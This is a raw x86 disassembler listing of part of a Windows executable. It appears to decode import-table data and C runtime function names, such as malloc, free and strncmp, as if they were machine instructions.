  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
